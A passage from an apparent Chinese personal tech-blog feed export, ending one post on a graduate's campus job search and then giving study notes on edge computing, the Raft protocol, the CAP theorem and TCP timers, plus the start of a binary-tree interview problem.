<p>　　最后在招银网络科技（深圳）和金山云（北京）之间做选择，深圳是一直向往的城市，金山云的工作和研究生期间的研究非常匹配，自己也非常感兴趣。当然，招银网络科技的工作自己也是有兴趣的，也是一个理想的选择，毕竟不怎么加班，工资待遇也还可以。招银网络科技虽然不及顶尖的互联网公司，但是也算是银行里互联网做得最好的公司了，现在银行也越来越最重视互联网技术，所以前景还是不错的。此外，自己对于金融方面也很有兴趣，毕竟自己平时炒股和买基金，一直想要钱生钱。不打算一辈子写代码，有考虑过金融方向的发展。最后，我考虑了很多方面，听取了家人、朋友、网友的建议，最后还是坚持了要去深圳，于是选择了招银网络科技。</p>
<p>　　秋招期间，面试很多家公司，远程面试的有腾讯、百度、网易有道、网易互娱、360、金山云、吉比特、奇安信等，现场面试的有招银网络科技、华为、中兴、去哪儿网、映客直播、联通软件研究院、电信研究院、工商银行、格力、vivo等。总结起来，现场面试拿到offer的几率远远大于远程面试。有一些公司需要特别聊一聊。</p>
<p>　　华为，曾经最想去的公司，特别是中美贸易战以后，爱国热情让我觉得应该去华为做一些有价值的工作。但是，结局不如人意。总结一句话，和华为，没有缘分。从找实习开始，折腾了大半年，也还是没能进去。实习的时候，投递了云计算开发工程师，笔试比较简单，面试基本不问技术，号称玄学面试。秋招的时候，投递的依然是云计算开发工程师，部门选择的是Cloud BU。一开始，根本没有收到面试通知。长沙面试第一天结束的晚上，接到软件特战队的面试通知。了解以后才知道，Cloud BU 的 HC 很少。听面试完回来的同学说，长沙的部门面试相对简单。现场想要改为面试长沙的华为，可是HR告诉我，这件事涉及到几个部门，需要沟通。于是，找来软件特战队的HR来和我沟通，一直在劝我还是面试软件特战队，他们只是一个入职以后的培训部门，后续会根据情况分配到不同的业务部门，包括华为云。所以，还是面试了软件特战队。由于今年改革，手撕代码的题目都是LeetCode中等难度，刷题比较少，勉强面完了3轮面试。不过，第二天查看面试进度就已经挂了。</p>
<p>　　面试体验不太好的有：（1）某知名安全厂商，本来内推了提前批，当时由于实习公司下班时间的问题，错过了笔试。后来又投了正式批，远程视频面试，1面很顺利，面完之后马上就安排了2面。2面的体验那就很差了，对方是一个女面试官，应该是在一个咖啡厅，特别吵，后来看牛客上评论，很多人都有提到这个问题。由于投递的是微服务开发工程师，问的问题都很偏实战，自己实战经验比较欠缺，回答得不好。面试官全程高冷，有点让人不太舒服。（2）某知名手机厂商的面试让我觉得这家公司可以一生黑了。只有一面技术面，基本没有问基础，面试官也说对于研究生考察的主要是逻辑思维和研究能力，也不关注用什么语言，所以主要问的项目，聊得还挺好。接下来就是HR面，全程欠钱脸，一直问缺点，一直说我说的不是他想听的，一直怼。回到学校，我才知道同门也去面了，他立马和我吐槽他的 HR 面，一进去就问为啥英语六级没过，同门一脸的问号。和他核对房间号，咦，原来 HR 面是同一个人。真想说一句，不想招人就别叫这么多人去面试嘛，浪费时间。（3）另外，还有某传统行业的公司把面试安排在酒店，但是，面试分3轮，每轮面试不在同一天，也就意味着需要。希望现在某某资本的投资能给它带来一些新的思想，也希望作为民族企业的它能够越来越好吧。</p>
<p>　　一场秋招下来，数不清的笔试面试，真的可以让你很清楚地看清自己的弱点。于我而言，基础不扎实是硬伤之一。由于是直接保研的，没有经历过考研这一关，很多基础知识，比如操作系统、复杂一点的数据结构、计算机网络的细节都忘得差不多了。读研以来，前两年一直沉迷科研，今年暑假又去实习，基本没有怎么花时间来复习这些基础知识，也没有去看网友分享的面经。这就导致面试的时候，经常回答不上来。基本上都是靠每次面试的来自己总结经验，以至于每次面试的结果都不理想。太老实是硬伤之二。现在的笔试环节大多是在线笔试，虽然有所谓的摄像头、手机监控等手段，但是其实都只是个形式。很多人其实都是团队作战，特别是编程题，实验室集体作战、或者宿舍集体作战都已经是公开的秘密。而我，本来算法部分就是自己的弱项，每次笔试基本都是自己单独做题，结果也就可想而知了。心理素质不太好是硬伤之三。面对自己非常想去公司，面试的时候经常会紧张到头脑一片空白。特别是手撕代码的环节，每次都紧张得要死，现在都有心理阴影了。</p>
<p>　　其次，编程语言也会限制你找工作的空间。比如，我是主打 Python，因为这是我最熟悉的语言。但是，从软开的角度来看，现在很多大公司都是 Java/C++ 。本来本科期间就是 Java 为主，后来搞科研，基本不怎么做项目，于是 Java 也荒废的差不多了。平时写代码基本用 Python，秋招之前也没有打算要换语言，于是准备的项目也是 Python 和 Go 语言的。但是，秋招发现，很多公司都很明确要招 Java 开发工程师或者 C++ 开发工程师，于是我都没有勇气去投递，这就已经错失了一些机会。然后，即使有的公司公布的职位不限定语言，但是在面试的时候，面试官还是会看重这个。如果决定不读博，那么一定要提早规划，按计划复习，按计划学习，按计划准备一些项目，确保自己秋招不会手忙脚乱。</p>
<p>　　秋招虽然只是人生路上一次小小的选择，但是，这可能会影响你的职业生涯。总之，从思想上重视，从行动上多下功夫。计划很重要，复习和准备也很重要。对于自己的秋招的一个简单的总结，也算是个人的一些肤浅的经验。希望，以此反思自己，同时，与看我博客的人共勉。</p>
]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title>边缘计算系列-谁在关注边缘计算</title>
    <url>/2019/11/10/%E8%BE%B9%E7%BC%98%E8%AE%A1%E7%AE%97%E7%B3%BB%E5%88%97-%E8%B0%81%E5%9C%A8%E5%85%B3%E6%B3%A8%E8%BE%B9%E7%BC%98%E8%AE%A1%E7%AE%97/</url>
    <content><![CDATA[<p><center>暑期开了个头，后来由于忙于实习、找工作，这个系列的博客就停滞了,接下来慢慢补上。</center><br><a id="more"></a></p>
<h4 id="学术界"><a href="#学术界" class="headerlink" title="学术界"></a>学术界</h4><h5 id="学术会议"><a href="#学术会议" class="headerlink" title="学术会议"></a>学术会议</h5><ul>
<li><a href="http://acm-ieee-sec.org/2019/" target="_blank" rel="external">ACM/IEEE Symposium on Edge Computing（SEC）</a><ul>
<li>边缘计算领域的旗舰会议，已经举办 4 届。</li>
</ul>
</li>
<li>中国边缘计算技术研讨会<ul>
<li>第一届边缘计算技术研讨会于 2017 年 7 月在合肥召开，由中科院计算所和安徽大学承办，注册参会人员50余人。</li>
<li>第二届边缘计算技术研讨会于 2018 年 5 月在西安召开，由西安电子科技大学承办，注册参会人员100余人。</li>
<li>2019年5月，第三届边缘计算技术研讨会由杭州电子科技大学和之江实验室主办，浙江工业大学和浙江科技学院承办，浙江大学、边缘计算产业联盟、浙江省计算机学会云计算专委会、复杂系统建模与仿真教育部重点实验室、CCF 杭州分部和 CCF YOCSEF 杭州协办。</li>
</ul>
</li>
<li>第四届边缘计算技术研讨会将于 2020 年在中山大学举办。</li>
<li>其他国际会议<ul>
<li><a href="http://theedgecomputing.org/2019/program.html" target="_blank" rel="external">International Conference on Edge Computing（EDGE）</a></li>
<li><a href="http://www.cloudbus.org/fog/icfec2019/" target="_blank" rel="external">International Conference on Fog and Edge Computing（ICFEC）</a></li>
<li><a href="https://emergingtechnet.org/FMEC2019/" target="_blank" rel="external">International Conference on Fog and Mobile Edge Computing（FMEC）</a></li>
</ul>
</li>
<li>Workshop<ul>
<li>USENIX Workshop on Hot Topics in Edge Computing</li>
<li>INFOCOMM: Workshop on Integrating Edge Computing, Caching, and Offloading in Next Generation Networks(IECCO)</li>
<li>ICC 2018: Workshop on Information-Centric Edge Computing and Caching for Future Networks</li>
<li>IEEE GLOBECOM 2019: Workshop on Information-Centric Edge Computing</li>
<li>IFIP Networking 2017：Workshop on Information-Centric Fog Computing (ICFC)</li>
</ul>
</li>
</ul>
<h5 id="学术组织"><a href="#学术组织" class="headerlink" title="学术组织"></a>学术组织</h5><ul>
<li>自动化学会-<a href="http://www.ecconsortium.org/" target="_blank" rel="external">边缘计算专委会</a></li>
</ul>
<h5 id="学术趋势"><a href="#学术趋势" class="headerlink" title="学术趋势"></a>学术趋势</h5><p>　　Google 学术趋势：</p>
<p><img src="https://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2019/11/10-1.png" alt="10-1"></p>
<h5 id="专业书籍"><a href="#专业书籍" class="headerlink" title="专业书籍"></a>专业书籍</h5><ul>
<li><a href="https://book.douban.com/subject/30116005/" target="_blank" rel="external">边缘计算</a>：介绍边缘计算的概念、起源及发展历史，对边缘计算的基本概念、模型、关键技术进行剖析，分析边缘计算与云计算、边缘计算与大数据之间的关联，探讨边缘计算的优势与面临的挑战，给出基于边缘计算模型的几种实际应用案例。</li>
<li><a href="https://book.douban.com/subject/30726653/" target="_blank" rel="external">边缘计算原理与实践</a>：对边缘计算的发展历史与趋势、几种典型的边缘计算技术的基本架构与原理进行了阐述，并对边缘计算涉及的关键技术与新进展、部署方案、应用场景与实践进行了详细讲解。</li>
<li><a href="https://book.douban.com/subject/34455756/" target="_blank" rel="external">边缘计算方法与工程实践</a>：对边缘计算的概念、原理、基础架构、软件架构、安全管理等方面都进行了深入剖析，并对业界的发展现状进行了全面介绍。通过大量的工程应用实例，将边缘计算从抽象的概念联系到实际应用，加深读者对边缘计算的理解，并使读者进一步掌握边缘计算架构设计的方法和理念。</li>
<li><a href="https://book.douban.com/subject/30815028/" target="_blank" rel="external">5G移动边缘计算</a>：阐述了移动边缘计算的基本概念，并且结合5G网络发展及运营商转型的现状，探讨移动边缘计算的发展方向；讲述与移动边缘计算相关的关键使能技术，包括边缘路由技术、网络能力开放、边缘计算平台及边缘计算技术等。</li>
<li><a href="https://book.douban.com/subject/30282355/" target="_blank" rel="external">雾计算：技术、架构及应用</a>：介绍了未来5G和物联网时代的雾计算技术、架构和应用。</li>
</ul>
<h5 id="专业课程"><a href="#专业课程" class="headerlink" title="专业课程"></a>专业课程</h5><p>　　2018年7月16日-20日，由 CCF 资助，龙星计划主办，中科院计算所泛在计算系统研究中心承办的龙星计划“边缘计算”课程在中国科学院计算技术研究所成功举办。受龙星计划委员会主席徐志伟研究员和张晓东教授的邀请，国际边缘计算的主要提出和倡导者之一的施巍松教授作为主讲教授出席了本次课程。</p>
<p><img src="https://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2019/11/10-2.jpg" alt="10-2"></p>
<h4 id="产业界"><a href="#产业界" class="headerlink" title="产业界"></a>产业界</h4><h5 id="工业组织"><a href="#工业组织" class="headerlink" title="工业组织"></a>工业组织</h5><ul>
<li><a href="http://www.ecconsortium.org/" target="_blank" rel="external">边缘计算产业联盟（ECC）</a></li>
<li>欧洲边缘计算产业联盟（ECCE）</li>
<li>……</li>
</ul>
<h5 id="华为云"><a href="#华为云" class="headerlink" title="华为云"></a>华为云</h5><ul>
<li><a href="https://www.huaweicloud.com/product/ief.html" target="_blank" rel="external">智能边缘平台（Intelligent EdgeFabric, IEF）</a></li>
</ul>
<p>　　智能边缘平台满足客户对边缘计算资源的远程管控、数据处理、分析决策以及智能化的诉求，支持海量边缘节点安全接入、边缘应用生命周期管理， 为用户提供完整的边云协同的一体化服务</p>
<ul>
<li><a href="https://kubeedge.io/en/" target="_blank" rel="external">KubeEdge</a></li>
</ul>
<p>　　KubeEdge 是一个开源系统，用于将本机容器化应用程序编排功能扩展到Edge上的主机，它基于 kubernetes 构建，并为网络，应用程序提供基本的基础架构支持。云和边缘之间的部署和元数据同步。</p>
<h5 id="AWS"><a href="#AWS" class="headerlink" title="AWS"></a>AWS</h5><ul>
<li><a href="https://aws.amazon.com/tr/lambda/edge/?nc1=h_ls" target="_blank" rel="external">Lambda@Edge</a></li>
</ul>
<p>　　让您在靠近应用程序用户的地方运行代码，从而提高性能，降低延迟。使用 Lambda@Edge，您无需在全球多个地方预置或管理基础设施。您只需按使用的计算时间付费 — 代码未运行时不产生费用。</p>
<ul>
<li><a href="https://aws.amazon.com/cn/greengrass/" target="_blank" rel="external">IoT Greengrass</a></li>
</ul>
<p>　　AWS IoT Greengrass 可将 AWS 无缝扩展至边缘设备，因此可以在本地操作其生成的数据，同时仍可将云用于管理、分析和持久存储。借助 Greengrass，连接的设备可以运行 Lambda 函数、基于机器学习模型执行预测，保持设备数据同步以及与其他设备安全通信 – 甚至在没有连接互联网的情况下也可实现这些功能。</p>
<h5 id="微软"><a href="#微软" class="headerlink" title="微软"></a>微软</h5><ul>
<li><a href="https://docs.microsoft.com/zh-cn/azure/iot-edge/about-iot-edge" target="_blank" rel="external">Azure IoT Edge</a></li>
</ul>
<p>　　Azure IoT Edge 将云分析和自定义业务逻辑移到设备，这样你的组织就可以专注于业务见解而非数据管理。 通过将业务逻辑打包到标准容器中，横向扩展 IoT 解决方案，然后可以将这些容器部署到任何设备，并从云中监视所有这些设备。</p>
<h5 id="阿里云"><a href="#阿里云" class="headerlink" title="阿里云"></a>阿里云</h5><ul>
<li><a href="https://iot.aliyun.com/products/linkedge" target="_blank" rel="external">Link Edge</a></li>
</ul>
<p>　　物联网边缘计算是一种可以在设备上运行本地计算、消息通信、数据缓存等功能的软件，它可部署于不同量级的智能设备和计算节点中，让其具备阿里云安全、存储、计算、人工智能等能力。Link Edge提供的安全可靠、低延时、低成本、易扩展的本地计算服务，联合云端的物联网平台、函数计算等能力，打造出云边端三位一体的计算体系。</p>
<ul>
<li><a href="https://help.aliyun.com/product/62684.html?spm=a2c4g.11186623.6.540.56736fc5Rvc1Hx" target="_blank" rel="external">边缘节点服务（Edge Node Service, ENS）</a></li>
</ul>
<p>　　基于运营商边缘节点和网络构建，一站式提供靠近终端用户的、全域覆盖的、弹性分布式算力资源，通过终端数据就近计算和处理，优化响应时延、中心负荷和整体成本。</p>
<h5 id="腾讯"><a href="#腾讯" class="headerlink" title="腾讯"></a>腾讯</h5><ul>
<li><a href="https://cloud.tencent.com/product/iecp" target="_blank" rel="external">物联网边缘计算平台（IoT Edge Computing Platform，IECP）</a></li>
</ul>
<p>　　将腾讯云存储、大数据、人工智能、安全等云端计算能力扩展至距离 IoT 设备数据源头最近的边缘节点，帮助客户在本地的计算硬件上，创建可以连接 IoT 设备，转发、存储、分析设备数据的本地边缘计算节点。</p>
<h5 id="百度"><a href="#百度" class="headerlink" title="百度"></a>百度</h5><ul>
<li><a href="https://edge.baidu.com/" target="_blank" rel="external">DuEdge</a></li>
</ul>
<p>　　边缘网络计算是指在靠近物或数据源头的一侧，采用网络、计算、存储、应用核心能力为一体的开放平台，就近提供最近端服务。</p>
]]></content>
      <categories>
        <category>Cloud/Edge Computing</category>
      </categories>
      <tags>
        <tag>边缘计算</tag>
      </tags>
  </entry>
  <entry>
    <title>分布式一致性协议 Raft</title>
    <url>/2019/11/09/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%80%E8%87%B4%E6%80%A7%E5%8D%8F%E8%AE%AE-Raft/</url>
    <content><![CDATA[<center>分布式一致性协议 Raft 学习。</center>

<a id="more"></a>
<h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p>　　Raft 协议有效的借鉴了美国总统大选的策略，采用精英（Raft 称呼这个精英为 Leader）领导全局的方案，整个集群中只有 Leader 可以处理 client 发送过来的请求，其他非 Leader 节点即使接收到请求也必须将其转发到 Leader 节点进行处理。Raft 集群中的成员分三种角色：</p>
<ul>
<li>Leader：领导者，处理所有客户端交互，日志复制等，一般一次只有一个Leader。</li>
<li>Follower：追随者，类似选民，完全被动。</li>
<li>Condidate：候选人，可以被选为一个新的领导人。</li>
</ul>
<p><img src="https://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2019/11/9-1.jpg" alt="9-1"></p>
<p>　　英文动画演示：<a href="http://thesecretlivesofdata.com/raft/" target="_blank" rel="external">http://thesecretlivesofdata.com/raft/</a></p>
<h4 id="选举过程"><a href="#选举过程" class="headerlink" title="选举过程"></a>选举过程</h4><h5 id="两个超时"><a href="#两个超时" class="headerlink" title="两个超时"></a>两个超时</h5><ul>
<li>选举超时</li>
</ul>
<p>　　为了每个节点同时发起投票，会给每个节点分配一个随机的选举超时时间（Election Timeout），即从Follower 状态成为 Candidate 状态需要等待的时间，随机分配在 150ms 到 300ms 之间。在这个时间内，节点必须等待，不能成为 Candidate 状态。</p>
<ul>
<li>心跳超时</li>
</ul>
<p>　　Leader 会固定间隔时间向 Follower 节点发送心跳消息，这个固定间隔时间被称为心跳超时（Heartbeat Timeout）</p>
<h5 id="选举流程"><a href="#选举流程" class="headerlink" title="选举流程"></a>选举流程</h5><ol>
<li><p>在集群初始状态下是没有 Leader 的，集群中所有成员均是 Follower。在选举开始期间，任何一个服务器（Follower）都可以成为一个候选者（Candidate）。</p>
</li>
<li><p>每一个节点都有自己的计时器，当计时达到了超时时间（Election Timeout），该节点会转变为Candidate。它向其他服务器（Follower）发出要求选举自己的请求。</p>
</li>
<li><p>其他收到投票请求且还未投票的服务器（Follower）节点会发出 OK 进行投票，发起者收到反馈通知后</p>
<p>票数增加。</p>
</li>
<li><p>如果在这个过程中，候选者可以自己选自己，只要达到 N/2 + 1 的大多数票，候选人就可以成为Leader，其余落败的 Condidate 角色转变为 Follower 开始服从 Leader 领导。</p>
</li>
<li><p>选举出 Leader 后 Leader 会定期向所有 Follower 发送 heartbeat 来维护其 Leader 地位，并且可以向选民（Follower）发出指令，比如进行日志复制。</p>
</li>
</ol>
<h5 id="重新选举"><a href="#重新选举" class="headerlink" title="重新选举"></a>重新选举</h5><p>　　如果所有 Condidate 均投票给自己，这样无法决出票数多的一方。Raft 算法为了解决这个问题引入了北洋时期袁世凯获选大总统的谋略，即选不出 Leader 不罢休，直到选出为止，一轮选不出 Leader，便令所有 Condidate 随机 sleep（Raft 论文称为 timeout，选举超时）一段时间，然后马上开始新一轮的选举，这里的随机 sleep 就起了很关键的因素，第一个从 sleap 状态恢复过来的 Condidate 会向所有 Condidate 发出投票给我的申请，这时还没有苏醒的 Condidate 就只能投票给已经苏醒的 Condidate ，因此可以有效解决 Condiadte 均投票给自己的故障，便可快速的决出 Leader。</p>
<p>　　如果 Follower 一段时间后未收到 Leader 的心跳则认为 Leader 已经挂掉，便转变自身角色为 Condidate，同时发起新一轮的选举，产生新的 Leader，其继续承担日志复制等指导工作。</p>
<h4 id="日志复制"><a href="#日志复制" class="headerlink" title="日志复制"></a>日志复制</h4><p>　　日志复制（Log Replication）主要作用是用于保证节点的一致性，这阶段所做的操作也是为了保证一致性与高可用性。</p>
<p><img src="https://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2019/11/9-2.jpg" alt="9-2"></p>
<p>　　数据一致性策略：Raft 协议强依赖 Leader 节点来确保集群数据一致性。即 Client 发送过来的数据均先到达 Leader 节点，Leader 接收到数据后，先将数据标记为 uncommitted 状态，随后 Leader 开始向所有 Follower 复制数据并等待响应，在获得集群中大于 N/2 个 Follower 的已成功接收数据完毕的响应后，Leader 将数据的状态标记为 committed，随后向 client 发送数据已接收确认，再向所有 Follower 节点发送通知表明该数据状态为committed。</p>
<p>　　日志复制流程：</p>
<ol>
<li>假设 Leader 已经选出，这时客户端向 Leader 发出增加日志的请求。</li>
<li>Leader 要求 Follower 遵从他的复制指令，都将这个新的日志内容追加到他们各自日志中。如果一次复制失败，会不断进行重试。</li>
<li>大多数 Follower 服务器将新的日志写入磁盘文件后，确认追加成功，发出 Commited OK。</li>
<li>随后提交自己的日志，向 client 发送数据已接收确认。在下一个心跳中，Leader会通知所有 Follower 更新 commited 项目。</li>
</ol>
<h4 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h4><h5 id="选举限制"><a href="#选举限制" class="headerlink" title="选举限制"></a>选举限制</h5><p>　　拥有最新的已提交的日志的 Follower 才有资格成为 Leader。</p>
<p>　　Candidate 在请求其他服务器（Follower）投票给自己时，要带上自己的最后一条日志的 term 和日志 index，其他节点收到消息时，如果发现自己的日志比请求中携带的更新，则拒绝投票。日志比较的原则是，如果本地的最后一条日志的 term 更大，则 term 大的更新，如果 term 一样大，则日志 index 更大的更新。</p>
<h5 id="日志提交限制"><a href="#日志提交限制" class="headerlink" title="日志提交限制"></a>日志提交限制</h5><p>　　Leader 只能推进 commit index 来提交当前 term 的已经复制到大多数服务器上的日志，旧 term 日志的提交要等到提交当前 term 的日志来间接提交（log index 小于 commit index 的日志被间接提交）。通俗来说，Leader 可以复制前面 term 的日志，但是不会主动提交前面 term 的日志。而是通过提交当前 term 的日志，而间接地提交前面 term 的日志。</p>
<p><img src="https://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2019/11/9-3.png" alt="9-3"></p>
<ol>
<li>在 (a) 中，S1 是 Leader，部分的复制了索引位置 2 的日志条目。</li>
<li>在 (b) 中，S1 离线，然后 S5 在任期 3 里通过 S3、S4 和自己的选票赢得选举，然后从客户端接收了一条不一样的日志条目放在了索引 2 处。</li>
<li>然后到 (c)，S5 又离线了；S1 重新启动，选举成功，开始复制日志。在这时，来自任期 2 的那条日志已经被复制到了集群中的大多数机器上，但是还没有被提交。</li>
<li>如果 S1 在 (d) 中又离线了，S5 可以重新被选举成功（通过来自 S2，S3 和 S4 的选票），然后覆盖了他们在索引 2 处的日志。反之，如果在离线之前，S1 把自己主导的新任期里产生的日志条目复制到了大多数机器上，就如 (e) 中那样，那么在后面任期里面这些新的日志条目就会被提交（因为S5 就不可能选举成功）。 这样在同一时刻就同时保证了，之前的所有老的日志条目就会被提交。</li>
</ol>
<p>　　在上图中，trem 2 内产生的日志可能在 (d) 的情况下被覆盖，所以在出现 (c) 的状态下，Leader 节点是不能提交 term 2 的日志条目的，即不能更新 commit index。</p>
<p>　　在上图 (e) 的情况下，commit index 的变化应该是1-&gt;3，即在 (c) 的情况下，term 4 在索引 3 的位置 commit 了一条消息，commit index 直接被修改成 3。而 term 2 的那条日志会通过 Log Matching Property 最终被复制到大多数节点且被应用。</p>
]]></content>
      <categories>
        <category>Distributed</category>
      </categories>
      <tags>
        <tag>Raft</tag>
      </tags>
  </entry>
  <entry>
    <title>分布式系统-CAP定理</title>
    <url>/2019/10/12/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F-CAP%E5%AE%9A%E7%90%86/</url>
    <content><![CDATA[<p>　　CAP理论作为分布式系统的基石，应该是每个入门分布式系统（包括区块链）的人都应该学习的内容。</p>
<a id="more"></a>
<h4 id="C、-A、P的含义"><a href="#C、-A、P的含义" class="headerlink" title="C、 A、P的含义"></a>C、 A、P的含义</h4><p><img src="https://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2019/10/12-1.png" alt="12-1"></p>
<p>　　CAP 指的是：</p>
<ul>
<li>Consistency，一致性。</li>
<li>Availability，可用性。</li>
<li>Partition tolerance，分区容错。</li>
</ul>
<h5 id="Consistency"><a href="#Consistency" class="headerlink" title="Consistency"></a>Consistency</h5><p>　　一致性指 “<code>all nodes see the same data at the same time</code>”，即所有节点在同一时间的数据完全一致。即写操作之后的读操作，必须返回该值。</p>
<p>　　通俗来说，对于客户端的每次读操作，要么读到的是最新的数据，要么读取失败。换句话说，一致性是站在分布式系统的角度，对访问本系统的客户端的一种承诺：要么我给您返回一个错误，要么我给你返回绝对一致的最新数据，不难看出，其强调的是数据正确。</p>
<h5 id="Availability"><a href="#Availability" class="headerlink" title="Availability"></a>Availability</h5><p>　　可用性指 “<code>Reads and writes always succeed</code>”，即服务在正常响应时间内一直可用。只要收到用户的请求，服务器就必须给出回应。</p>
<p>　　通俗来说，任何客户端的请求都能得到响应数据，不会出现响应错误。换句话说，可用性是站在分布式系统的角度，对访问本系统的客户的另一种承诺：我一定会给您返回数据，不会给你返回错误，但不保证数据最新，强调的是不出错。</p>
<h5 id="Partition-tolerance"><a href="#Partition-tolerance" class="headerlink" title="Partition tolerance"></a>Partition tolerance</h5><p>　　分区容错性指 “<code>the system continues to operate despite arbitrary message loss or failure of part of the system</code>”，即分布式系统在遇到某节点或网络分区故障的时候，仍然能够对外提供满足一致性或可用性的服务。</p>
<p>　　通俗来说，由于分布式系统通过网络进行通信，网络是不可靠的。当任意数量的消息丢失或延迟到达时，系统仍会继续提供服务，不会挂掉。换句话说，分区容忍性是站在分布式系统的角度，对访问本系统的客户端的再一种承诺：我会一直运行，不管我的内部出现何种数据同步问题，强调的是不挂掉。</p>
<h4 id="C、A、P三者之间的冲突"><a href="#C、A、P三者之间的冲突" class="headerlink" title="C、A、P三者之间的冲突"></a>C、A、P三者之间的冲突</h4><p>　　CAP 理论说的就是：一个分布式系统，不可能同时做到这三点。但是，不要以为在所有时候都只能选择两个特性。在不存在网络失败的情况下（分布式系统正常运行时），C 和 A能够同时保证。只有当网络发生分区或失败时，才会在 C 和 A 之间做出选择。</p>
<p>　　对于一个分布式系统而言，P 是前提，必须保证，因为只要有网络交互就一定会有延迟和数据丢失，这种状况必须接受，必须保证系统不能挂掉。所以只剩下C、A可以选择。要么保证数据一致性（保证数据绝对正确），要么保证可用性（保证系统不出错）。</p>
<p>　　由于分区容错性可能出现，因此一致性和可用性不可能同时成立。系统设计时只能选择一个目标。如果追求一致性，那么无法保证所有节点的可用性；如果追求所有节点的可用性，那就没法做到一致性。</p>
<p>　　例如两台服务器，如果保证 S2 的一致性，那么 S1 必须在写操作时，锁定 S2 的读操作和写操作。只有数据同步后，才能重新开放读写。锁定期间，S2 不能读写，没有可用性不。如果保证 S2 的可用性，那么势必不能锁定 S2，所以一致性不成立。</p>
]]></content>
      <categories>
        <category>Distributed</category>
      </categories>
      <tags>
        <tag>CAP</tag>
      </tags>
  </entry>
  <entry>
    <title>TCP 中的7种定时器</title>
    <url>/2019/09/26/TCP-%E4%B8%AD%E7%9A%847%E7%A7%8D%E5%AE%9A%E6%97%B6%E5%99%A8/</url>
    <content><![CDATA[<p><center>学习总结 TCP 中7种非常重要的定时器。</center><br><a id="more"></a></p>
<h4 id="握手阶段"><a href="#握手阶段" class="headerlink" title="握手阶段"></a>握手阶段</h4><h5 id="连接建立定时器"><a href="#连接建立定时器" class="headerlink" title="连接建立定时器"></a>连接建立定时器</h5><p>　　当发送端发送 SYN 报文想建立一条新连接时，会开启连接建立定时器，如果没有收到对端的 SYN+ACK 包，则将进行重传。重传的次数由 <code>/proc/sys/net/ipv4/tcp_syn_retries</code> 决定，例如 Ubuntu 系统下，该值为6，那么最多将重传 6 次（间隔是指数递增的， 1s、2s、4s、8s、16s、32s），6 次重试以后放弃重试，connect 调用返回 -1，调用超时。</p>
<h4 id="数据传输阶段"><a href="#数据传输阶段" class="headerlink" title="数据传输阶段"></a>数据传输阶段</h4><h5 id="重传定时器"><a href="#重传定时器" class="headerlink" title="重传定时器"></a>重传定时器</h5><p>　　主要用于处理在发送数据包的时候没有收到 ACK 的情况。重传定时器的时间是动态计算的，取决于 RTT 和重传的次数。重传时间间隔也是指数级退避，直到达到 120s 为止，重传次数是15次（由操作系统的 <code>/proc/sys/net/ipv4/tcp_retries2</code> 决定)，总时间将近 15 分钟。</p>
<h5 id="延迟-ACK-定时器"><a href="#延迟-ACK-定时器" class="headerlink" title="延迟 ACK 定时器"></a>延迟 ACK 定时器</h5><p>　　在 TCP 收到数据包以后在没有数据包要回复时，不马上回复 ACK。这时开启一个定时器，等待一段时间看是否有数据需要回复。如果期间有数据要回复，则在回复的数据中捎带 ACK，如果时间到了也没有数据要发送，则也发送 ACK。</p>
<h5 id="keep-alive-定时器"><a href="#keep-alive-定时器" class="headerlink" title="keep-alive 定时器"></a>keep-alive 定时器</h5><p>　　TCP 的设计中，如果双方都没有关闭连接，同时连接的空闲时间超过 2 小时，就会发送一个探测报文。如果对方有回复则表示连接还活着，对方还在，如果经过几次探测对方都没有回复则表示连接已失效，客户端会丢弃这个连接。keep-alive 定时器就是用于定时探测是否存活。</p>
<h5 id="Persist-定时器"><a href="#Persist-定时器" class="headerlink" title="Persist 定时器"></a>Persist 定时器</h5><p>　　专门用于零窗口探测。TCP 利用滑动窗口来实现流量控制，当接收端 B 接收窗口为 0 时，发送端 A 此时不能再发送数据，发送端此时开启 Persist 定时器，超时后发送一个特殊的报文给接收端看对方窗口是否已经恢复，这个特殊的报文只有一个字节。</p>
<h4 id="挥手阶段"><a href="#挥手阶段" class="headerlink" title="挥手阶段"></a>挥手阶段</h4><h5 id="FIN-WAIT-2-定时器"><a href="#FIN-WAIT-2-定时器" class="headerlink" title="FIN_WAIT_2 定时器"></a>FIN_WAIT_2 定时器</h5><p>　　在挥手阶段，用 FIN_WAIT_2 定时器来防止被动关闭连接的一方一直不发送 FIN 包，导致关闭连接的一方一直处于等待状态。这个值由<code>/proc/sys/net/ipv4/tcp_fin_timeout</code> 决定，Ubuntu 系统中默认为 60 ms。</p>
<h5 id="TIME-WAIT-定时器"><a href="#TIME-WAIT-定时器" class="headerlink" title="TIME_WAIT 定时器"></a>TIME_WAIT 定时器</h5><p>　　主动关闭连接的一方在接收到被动关闭连接的一方发送的 FIN 包，并发送 ACK后，需等待 2MSL 的时间才能关闭连接。这主要是为了可靠的实现 TCP 全双工的连接终止（处理最后 ACK 丢失的情况），避免当前关闭连接与后续连接混淆（让旧连接的包在网络中消逝）。因为在 TIME_WAIT 持续 2 个 MSL 的时间后，端口号才可以被安全的重用。</p>
]]></content>
      <categories>
        <category>Network</category>
      </categories>
      <tags>
        <tag>Network</tag>
        <tag>TCP</tag>
      </tags>
  </entry>
  <entry>
    <title>剑指offer-二叉树(四)</title>
    <url>/2019/09/10/%E5%89%91%E6%8C%87offer-%E4%BA%8C%E5%8F%89%E6%A0%91-%E5%9B%9B/</url>
    <content><![CDATA[<center>秋招，来了！</center>

<a id="more"></a>
<h4 id="二叉搜索树的后序遍历序列"><a href="#二叉搜索树的后序遍历序列" class="headerlink" title="二叉搜索树的后序遍历序列"></a>二叉搜索树的后序遍历序列</h4><h5 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h5><p>　　输入一个整数数组，判断该数组是不是某二叉搜索树的后序遍历的结果。如果是则输出Yes，否则输出No。假设输入的数组的任意两个数字都互不相同。</p>
